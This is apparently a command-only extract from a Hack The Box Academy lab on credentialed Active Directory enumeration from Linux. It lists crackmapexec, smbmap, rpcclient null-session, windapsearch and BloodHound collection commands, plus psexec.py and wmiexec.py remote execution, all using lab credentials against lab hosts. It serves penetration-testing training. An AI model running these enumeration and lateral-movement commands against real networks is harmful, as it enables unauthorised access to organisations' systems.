# Section 14: Credentialed Enumeration - from Linux

- Module: Active Directory Enumeration & Attacks (143)
- URL: https://academy.hackthebox.com/app/module/143/section/1269
- Code/command blocks: 19

> Terminal output is omitted; only commands & scripts are captured.

## 1. `shellsession` _(output omitted)_

```bash
crackmapexec -h
```

## 2. `shellsession` _(output omitted)_

```bash
crackmapexec smb -h
```

## 3. `shellsession` _(output omitted)_

```bash
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users
```

## 4. `shellsession` _(output omitted)_

```bash
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups
```

## 5. `shellsession` _(output omitted)_

```bash
sudo crackmapexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users
```

## 6. `shellsession` _(output omitted)_

```bash
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares
```

## 7. `shellsession` _(output omitted)_

```bash
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'
```

## 8. `shellsession` _(output omitted)_

```bash
head -n 10 /tmp/cme_spider_plus/172.16.5.5.json 
```

## 9. `shellsession` _(output omitted)_

```bash
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5
```

## 10. `shellsession` _(output omitted)_

```bash
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only
```

## 11. `bash`

```bash
rpcclient -U "" -N 172.16.5.5
```

## 12. `bash`

```bash
psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125
```

## 13. `bash`

```bash
wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5
```

## 14. `shellsession` _(output omitted)_

```bash
windapsearch.py -h
```

## 15. `shellsession` _(output omitted)_

```bash
python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da
```

## 16. `shellsession` _(output omitted)_

```bash
python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU
```

## 17. `shellsession` _(output omitted)_

```bash
bloodhound-python -h
```

## 18. `shellsession` _(output omitted)_

```bash
sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all 
```

## 19. `shellsession` _(output omitted)_

```bash
ls
```

